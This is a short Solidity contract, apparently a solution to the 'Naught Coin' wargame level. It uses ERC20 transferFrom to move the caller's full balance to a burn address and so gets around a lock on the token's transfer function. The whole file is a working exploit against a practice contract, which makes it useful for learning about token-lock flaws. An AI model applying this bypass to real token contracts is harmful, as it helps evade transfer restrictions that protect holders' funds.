// SPDX-License-Identifier: MIT
pragma solidity ^0.8.15;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract NaughtCoinAttacker {
    ERC20 target;

    constructor() {}

    function attack(address payable targetAddress) external {
        target = ERC20(targetAddress);
        target.transferFrom(msg.sender, address(0xdead), target.balanceOf(msg.sender));
    }
}
